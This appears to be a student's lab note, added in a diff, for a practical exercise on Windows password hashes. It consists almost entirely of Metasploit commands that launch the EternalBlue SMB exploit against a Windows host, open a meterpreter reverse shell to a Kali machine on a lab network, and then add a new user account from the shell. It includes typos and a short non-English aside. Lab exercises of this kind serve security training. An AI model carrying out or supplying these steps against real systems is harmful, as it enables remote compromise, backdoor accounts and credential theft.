@@ -1,0 +1,46 @@
+
+practicle : 5
+
+
+
+getting windows xp/7 password lm hashes ans cracking it to get the password and creack it with any password creacking tool
+
+password hide 
+
+
+
+
+
+
+msfconsole 
+
+search exploit/windows/smb
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+show payloads 
+
+set payload payload/windows/x64/meterpreter/reverse_tcp
+
+show targets
+
+show options
+
+set RHOST 10.10.10.3  -windows ip
+
+set LHOST 10.10.10.2  -kali ip
+
+set LPORT 5555
+
+exploit
+
+pwd
+
+shell
+
+net user abc 333 /ADD user active 
+
+net user abc 333 /ADD user active (yes ma no krvanu)no
+
+
+
